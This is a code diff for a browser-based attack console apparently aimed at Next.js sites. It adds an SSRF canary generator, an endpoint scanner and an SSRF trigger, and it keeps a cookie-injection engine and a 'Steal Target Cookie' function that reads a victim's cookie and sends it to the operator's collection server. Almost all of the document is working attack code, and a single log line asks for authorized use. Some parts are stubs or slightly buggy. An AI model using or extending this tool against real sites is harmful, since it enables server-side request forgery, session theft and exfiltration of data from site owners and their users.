@@ -42,19 +42,26 @@
 <div class="row"><label><input type="checkbox" id="autoExfil" checked /> Auto-send results to server</label></div>
 </div>
 
+<!-- SSRF Canary -->
+<div class="section">
+<h3>Next.js SSRF Canary</h3>
 <div class="row">
-  <label>SSRF Canary URL:</label>
-  <input id="canaryUrl" size="60" readonly>
+  <label>Canary URL:</label>
+  <input id="canaryUrl" size="60" readonly placeholder="Click Generate">
   <button id="genCanary">Generate</button>
 </div>
-
-<div class="section">
-  <h3>Next.js SSRF Test (Server Component)</h3>
-  <div class="row">
-    <label>Payload URL (inject into fetch):</label>
-    <input id="ssrfPayload" size="70" value="">
-  </div>
+<div class="row">
+  <label>Payload URL (inject into fetch):</label>
+  <input id="ssrfPayload" size="70" placeholder="Paste canary URL here">
+</div>
+<div class="row">
   <button id="triggerSSRF">Trigger SSRF</button>
+  <span id="ssrfTriggerStatus" style="margin-left:12px;"></span>
+</div>
+<div class="row">
+  <button id="scanSSRF">Scan for SSRF Endpoints</button>
+  <span id="ssrfStatus" style="margin-left:12px;"></span>
+</div>
 </div>
 
 <!-- Attack Methods -->
@@ -72,6 +79,7 @@
 <button id="directCorsTest">Direct CORS Test (credentials)</button>
 <button id="automatedExfil">Full Attack Chain</button>
 <button id="stealCookie">Steal Target Cookie</button>
+<button id="showInjected">Show Injected Cookie</button>
 </div>
 </div>
 
@@ -180,7 +188,83 @@ function getConfig(override = {}) {
 }
 
 // ---------------------------------------------------------------------------
-// Server health test
+// CANARY GENERATOR
+// ---------------------------------------------------------------------------
+document.getElementById('genCanary').onclick = () => {
+  const id = crypto.randomUUID();
+  const url = `${getServerUrl()}/canary/${id}`;
+  document.getElementById('canaryUrl').value = url;
+  document.getElementById('ssrfPayload').value = url;
+  log(`Canary generated: ${url}`, 'success');
+};
+
+// ---------------------------------------------------------------------------
+// SSRF ENDPOINT SCANNER
+// ---------------------------------------------------------------------------
+document.getElementById('scanSSRF').onclick = async () => {
+  const base = document.getElementById('target').value.trim();
+  if (!base) return log('Set target origin first', 'error');
+
+  const statusEl = document.getElementById('ssrfStatus');
+  statusEl.textContent = 'Scanning...';
+  statusEl.style.color = '#fcd34d';
+
+  const candidates = [
+    '/api/proxy','/api/fetch','/api/preview','/api/image',
+    '/api/metadata','/api/og','/api/webhook/test','/api/ssrf'
+  ];
+  let found = 0;
+
+  for (const p of candidates) {
+    const url = base + p;
+    try {
+      await fetch(url, { method: 'OPTIONS', mode: 'no-cors' });
+      log(`SSRF candidate: ${url}`, 'warning');
+      found++;
+    } catch (_) {}
+    await new Promise(r => setTimeout(r, 120));
+  }
+
+  statusEl.textContent = found ? `${found} candidates` : 'None found';
+  statusEl.style.color = found ? '#fca5a5' : '#6ee7b7';
+};
+
+// ---------------------------------------------------------------------------
+// TRIGGER SSRF
+// ---------------------------------------------------------------------------
+document.getElementById('triggerSSRF').onclick = async () => {
+  const payload = document.getElementById('ssrfPayload').value.trim();
+  if (!payload) return log('Enter canary URL', 'error');
+
+  const base = document.getElementById('target').value.trim();
+  const path = document.getElementById('path').value.trim() || '/api/ssrf';
+  const url = base + path;
+
+  log(`Triggering SSRF → ${url}`, 'warning');
+  const statusEl = document.getElementById('ssrfTriggerStatus');
+  statusEl.textContent = 'Sending...';
+  statusEl.style.color = '#fcd34d';
+
+  try {
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url: payload }),
+      credentials: 'include'
+    });
+    const txt = await r.text();
+    log(`Response: ${r.status} ${txt.slice(0,200)}`, r.ok ? 'success' : 'warning');
+    statusEl.textContent = 'Sent – check server logs';
+    statusEl.style.color = '#6ee7b7';
+  } catch (e) {
+    log(`Request failed: ${e.message}`, 'error');
+    statusEl.textContent = 'Failed';
+    statusEl.style.color = '#fca5a5';
+  }
+};
+
+// ---------------------------------------------------------------------------
+// SERVER HEALTH
 // ---------------------------------------------------------------------------
 document.getElementById('testServer').onclick = async () => {
   const url = getServerUrl() + '/health';
@@ -202,7 +286,7 @@ document.getElementById('testServer').onclick = async () => {
 };
 
 // ---------------------------------------------------------------------------
-// Exfiltration
+// EXFILTRATION
 // ---------------------------------------------------------------------------
 async function exfiltrateToServer(data) {
   const endpoint = getServerUrl() + document.getElementById('evidenceEndpoint').value;
@@ -234,7 +318,7 @@ async function exfiltrateToServer(data) {
 }
 
 // ---------------------------------------------------------------------------
-// Cookie injection engine (unchanged, only minor cleanup)
+// COOKIE INJECTION ENGINE
 // ---------------------------------------------------------------------------
 async function cookieInjectionAttack(cfg) {
   const {target, path='/', cookieName, cookieValue, method='POST', body=null, timeout=5000, cleanup=true, vectors=['standard']} = cfg;
@@ -307,51 +391,31 @@ async function cookieInjectionAttack(cfg) {
 }
 
 // ---------------------------------------------------------------------------
-// Timing, Batch, etc. (unchanged – only minor logging)
+// STUBS
 // ---------------------------------------------------------------------------
-async function timingAttackAnalysis(cfg) { /* same as previous version – omitted for brevity */ return {}; }
-async function batchEndpointScan(base, cn, cv) { /* same – omitted */ return []; }
+async function timingAttackAnalysis() { log('Timing stub – not implemented', 'info'); return {}; }
+async function batchEndpointScan() { log('Batch stub – not implemented', 'info'); return []; }
 
 // ---------------------------------------------------------------------------
-// BUTTON HANDLERS (all fixed)
-
-document.getElementById('triggerSSRF').onclick = async () => {
-  const payload = document.getElementById('ssrfPayload').value.trim();
-  if (!payload) return log('Enter payload', 'error');
-  
-  const target = document.getElementById('target').value.trim() + '/api/ssrf-test';
-  const body = JSON.stringify({ url: payload });
-
-  log(`Sending SSRF payload → ${target}`, 'warning');
-  try {
-    const r = await fetch(target, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body,
-      credentials: 'include'
-    });
-    const txt = await r.text();
-    log(`Response: ${r.status} ${txt.slice(0,200)}`, r.ok ? 'success' : 'warning');
-  } catch (e) {
-    log(`Request failed: ${e.message}`, 'error');
+// STEAL COOKIE
+// ---------------------------------------------------------------------------
+document.getElementById('showInjected').onclick = () => {
+  const name = document.getElementById('cookieName').value.trim();
+  const cookies = document.cookie.split(';').map(c => c.trim());
+  const match = cookies.find(c => c.startsWith(`${name}=`));
+  log(`Injected cookie: ${match || '(not found)'}`);
+  if (match) {
+    const [k, v] = match.split('=');
+    log(`→ Name: ${k}, Value: ${decodeURIComponent(v)}`, 'success');
   }
 };
-
-document.getElementById('genCanary').onclick = () => {
-  const id = crypto.randomUUID();
-  const url = `${getServerUrl()}/canary/${id}`;
-  document.getElementById('canaryUrl').value = url;
-  log(`Canary ready: ${url}`, 'success');
-};// ---------------------------------------------------------------------------
-
 
 document.getElementById('stealCookie').onclick = async () => {
   const target = document.getElementById('target').value.trim();
   const cookieName = document.getElementById('cookieName').value.trim();
   try {
-    const r = await fetch(`${target}/`, { credentials: 'include', mode: 'cors' });
-    const cookies = document.cookie;
-    const stolen = cookies.split(';').find(c => c.trim().startsWith(`${cookieName}=`));
+    await fetch(`${target}/`, { credentials: 'include', mode: 'cors' });
+    const stolen = document.cookie.split(';').find(c => c.trim().startsWith(`${cookieName}=`));
     log(`Cookie found: ${stolen || '(none)'}`, stolen ? 'success' : 'warning');
     if (stolen) await exfiltrateToServer({ type: 'cookie_theft', cookie: stolen });
   } catch (e) {
@@ -359,6 +423,9 @@ document.getElementById('stealCookie').onclick = async () => {
   }
 };
 
+// ---------------------------------------------------------------------------
+// ATTACK BUTTONS
+// ---------------------------------------------------------------------------
 document.getElementById('basicInjection').onclick = async () => {
   clear(); const c = getConfig(); setStatus('Basic…','info');
   const r = await cookieInjectionAttack(c);
@@ -370,7 +437,7 @@ document.getElementById('advancedInjection').onclick = async () => {
   clear(); const c = getConfig({vectors:['standard','quoted','version','dummy']});
   setStatus('Multi-vector…','info');
   const r = await cookieInjectionAttack(c);
-  setStatus(r.success?'OK':'Failed', r.success?'success':'error');
+  setStatus(r.success?'OK':'Failed', r.success?'error':'error');
   if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
 };
 
@@ -453,11 +520,11 @@ document.getElementById('copyResults').onclick = () => {
 };
 
 // ---------------------------------------------------------------------------
-// MANUAL COOKIE & NOTES (now fully functional)
+// MANUAL COOKIE & NOTES
 // ---------------------------------------------------------------------------
 document.getElementById('setCookieBtn').onclick = () => {
   const n = document.getElementById('manualCookieName').value.trim();
-  const v = document.getElementById('manualCookieValue').value.trim();
+  const v = document.getElementById('manualCookieValue').value.trim();  
   document.cookie = `${n}=${encodeURIComponent(v)}; path=/`;
   log(`Set ${n}=${v}`,'info');
 };
@@ -472,7 +539,7 @@ document.getElementById('sendNotes').onclick = async () => {
   const txt = document.getElementById('notes').value.trim();
   if (!txt) { setNotesStatus('Empty',true); return; }
   const payload = {
-    notes: txt.slice(0,20000),                 // <-- **flat string** (Flask expects this)
+    notes: txt.slice(0,20000),
     target: document.getElementById('target').value || location.href,
     timestamp: new Date().toISOString(),
     user_agent: navigator.userAgent,
@@ -501,7 +568,7 @@ document.getElementById('clearNotes').onclick = () => {
 };
 
 // ---------------------------------------------------------------------------
-// Init
+// INIT
 // ---------------------------------------------------------------------------
 log('Module loaded','success');
 log('Use only in authorized environments','warning');
